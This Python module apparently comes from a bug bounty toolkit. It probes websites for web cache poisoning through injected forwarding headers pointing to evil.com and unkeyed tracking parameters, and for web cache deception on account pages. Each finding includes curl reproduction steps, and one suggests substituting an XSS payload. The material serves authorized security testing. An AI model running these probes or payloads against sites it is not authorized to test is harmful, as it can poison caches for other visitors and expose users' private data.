# Bug Bounty Tool Kit  ─  by Hacker00X1  |  Authorized use only
"""Web Cache Poisoning & Deception — header injection, unkeyed params, path confusion."""

import urllib.parse
import urllib.request
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from data.webfuzz import fetch_url

CACHE_HEADERS = ["X-Cache","CF-Cache-Status","X-Varnish","Age","X-Cache-Hits",
                 "X-Served-By","X-CDN","X-Proxy-Cache","Surrogate-Key",
                 "X-WP-CF-Super-Cache","Fastly-Debug-Digest"]

POISON_HEADERS = [
    ("X-Forwarded-Host",     "evil.com"),
    ("X-Forwarded-Scheme",   "http"),
    ("X-Forwarded-Proto",    "nohttps"),
    ("X-Host",               "evil.com"),
    ("X-Forwarded-Server",   "evil.com"),
    ("X-HTTP-Host-Override", "evil.com"),
    ("Forwarded",            "host=evil.com"),
    ("X-Original-URL",       "/evil"),
    ("X-Rewrite-URL",        "/evil"),
    ("X-Forwarded-Port",     "1337"),
    ("X-Real-IP",            "127.0.0.1"),
]

UNKEYED_PARAMS = [
    "utm_source","utm_medium","utm_campaign","utm_content","utm_term",
    "fbclid","gclid","mc_eid","_ga","_gclid",
    "ref","referrer","source","campaign","preview","debug","_debug",
    "nocache","cachebust","ver","v","cb","ts","rand",
]

DECEPTION_PATHS = [
    "/account", "/profile", "/settings", "/dashboard",
    "/api/me", "/api/user", "/orders", "/payment",
    "/admin", "/inbox", "/notifications",
]

STATIC_SUFFIXES = [".css",".js",".png",".jpg",".ico",".woff",".woff2",".svg",".gif"]

CVSS_HIGH = "8.1 (High)   — CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:L/A:N"
CVSS_MED  = "6.1 (Medium) — CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"


def _detect_cache(base_url: str, timeout: int) -> dict:
    resp = fetch_url(base_url, timeout=timeout)
    if not resp:
        return {"cached": False, "signals": {}}
    headers = {k.lower(): v for k, v in (resp.get("headers") or {}).items()}
    signals = {h: headers[h.lower()] for h in CACHE_HEADERS if h.lower() in headers}
    age = int(headers.get("age", 0) or 0)
    return {"cached": bool(signals) or age > 0, "signals": signals, "age": age}


def _check_poisoning(base_url: str, timeout: int) -> list[dict]:
    findings = []
    marker = f"h00x1-{uuid.uuid4().hex[:8]}"
    for hname, hval in POISON_HEADERS:
        try:
            req = urllib.request.Request(base_url)
            req.add_header(hname, hval)
            req.add_header("User-Agent", "BugBountyTool/1.0")
            req.add_header("Cache-Control", "no-cache")
            with urllib.request.urlopen(req, timeout=timeout) as r:
                body = r.read(5000).decode("utf-8", errors="replace")
                hdrs = {k.lower(): v for k, v in r.getheaders()}
            # Value reflected in body
            if hval in body and hval not in ("http","nohttps","127.0.0.1","/evil","1337"):
                # Check if cache stores it
                resp2 = fetch_url(base_url, timeout=timeout)
                if resp2 and hval in (resp2.get("body") or ""):
                    findings.append({
                        "type": "Web Cache Poisoning — Cached Reflection",
                        "severity": "HIGH",
                        "url": base_url,
                        "poison_header": f"{hname}: {hval}",
                        "cvss": CVSS_HIGH,
                        "description": f"Value from '{hname}' reflected in body AND persists in cached response — cache poisoned.",
                        "steps_to_reproduce": (
                            f"1. curl -H '{hname}: {hval}' -H 'Cache-Control: no-cache' '{base_url}'\n"
                            f"   → '{hval}' appears in response body\n"
                            f"2. curl '{base_url}' (no header) → cached response still contains '{hval}'\n"
                            "3. All subsequent users receive poisoned page."
                        ),
                        "impact": "Persistent XSS for all visitors, CSP bypass, forced HTTP downgrade, malicious redirects.",
                        "recommendation": "Strip unrecognised/dangerous request headers before caching. Mark headers as Vary. Use cache key normalization.",
                    })
                elif hval in body:
                    findings.append({
                        "type": "Web Cache Poisoning — Header Reflection",
                        "severity": "MEDIUM",
                        "url": base_url,
                        "poison_header": f"{hname}: {hval}",
                        "cvss": CVSS_MED,
                        "description": f"Header '{hname}: {hval}' reflected in response — may poison cache depending on CDN config.",
                        "steps_to_reproduce": (
                            f"1. curl -H '{hname}: {hval}' '{base_url}'\n"
                            f"2. Observe '{hval}' in response body."
                        ),
                        "impact": "If cached, all visitors receive injected content.",
                        "recommendation": "Sanitize reflected headers. Add headers to cache key with Vary header.",
                    })
        except Exception:
            pass
    return findings


def _check_unkeyed_params(base_url: str, timeout: int) -> list[dict]:
    findings = []
    marker = uuid.uuid4().hex[:10]
    parsed = urllib.parse.urlparse(base_url)
    for param in UNKEYED_PARAMS:
        test_url = urllib.parse.urlunparse(parsed._replace(
            query=urllib.parse.urlencode({param: marker}, doseq=True)
        ))
        resp = fetch_url(test_url, timeout=timeout)
        if resp and marker in (resp.get("body") or ""):
            clean = fetch_url(base_url, timeout=timeout)
            if clean and marker in (clean.get("body") or ""):
                findings.append({
                    "type": "Web Cache Poisoning — Unkeyed Parameter",
                    "severity": "HIGH",
                    "url": base_url,
                    "param": param,
                    "cvss": CVSS_HIGH,
                    "description": f"Unkeyed param '{param}' reflected and persists in cache — classic cache poisoning vector.",
                    "steps_to_reproduce": (
                        f"1. curl '{test_url}' → observe '{marker}' in body\n"
                        f"2. curl '{base_url}' (clean) → still sees '{marker}' — cached\n"
                        "3. Replace marker with XSS payload: '{param}=<script>alert(1)</script>'"
                    ),
                    "impact": "Stored XSS via cache for all visitors, malicious script injection.",
                    "recommendation": "Don't include untracked params in responses. Use cache key normalization. Strip marketing params before caching.",
                })
    return findings


def _check_deception(base_url: str, timeout: int) -> list[dict]:
    findings = []
    for path in DECEPTION_PATHS:
        for suffix in STATIC_SUFFIXES[:4]:
            url = base_url.rstrip("/") + path + "/x" + suffix
            resp = fetch_url(url, timeout=timeout)
            if not resp or resp.get("status") != 200:
                continue
            headers = {k.lower(): v for k, v in (resp.get("headers") or {}).items()}
            body = resp.get("body") or ""
            cached = any(headers.get(h.lower()) for h in CACHE_HEADERS) or int(headers.get("age", 0) or 0) > 0
            if cached and any(w in body.lower() for w in ["email","account","user","token","profile","id"]):
                findings.append({
                    "type": "Web Cache Deception",
                    "severity": "HIGH",
                    "url": url,
                    "cvss": CVSS_HIGH,
                    "description": f"Authenticated page {path} accessible via static-extension path and cached — web cache deception.",
                    "steps_to_reproduce": (
                        f"1. As victim (authenticated): visit {url}\n"
                        "2. Page cached as 'static' content (Cache-Age > 0)\n"
                        f"3. As attacker (unauthenticated): curl '{url}' → victim's account data returned."
                    ),
                    "impact": "Unauthenticated users can read authenticated users' private data from cache.",
                    "recommendation": "Cache only static resources by Content-Type, not URL extension. Require auth on ALL dynamic pages. Set Cache-Control: no-store on authenticated responses.",
                })
    return findings


def run(base_url: str, domain: str = "", timeout: int = 5, threads: int = 5, **kwargs) -> dict:
    findings: list[dict] = []
    cache_info = _detect_cache(base_url, timeout)
    with ThreadPoolExecutor(max_workers=3) as ex:
        f1 = ex.submit(_check_poisoning,     base_url, timeout)
        f2 = ex.submit(_check_unkeyed_params, base_url, timeout)
        f3 = ex.submit(_check_deception,     base_url, timeout)
        for f in [f1, f2, f3]:
            findings.extend(f.result())
    return {
        "findings": findings,
        "cache_detected": cache_info.get("cached", False),
        "cache_signals": cache_info.get("signals", {}),
        "summary": {
            "cache_detected": cache_info.get("cached", False),
            "poison_headers_tested": len(POISON_HEADERS),
            "unkeyed_params_tested": len(UNKEYED_PARAMS),
            "deception_paths_tested": len(DECEPTION_PATHS),
            "total_findings": len(findings),
        },
    }


if __name__ == "__main__":
    pass
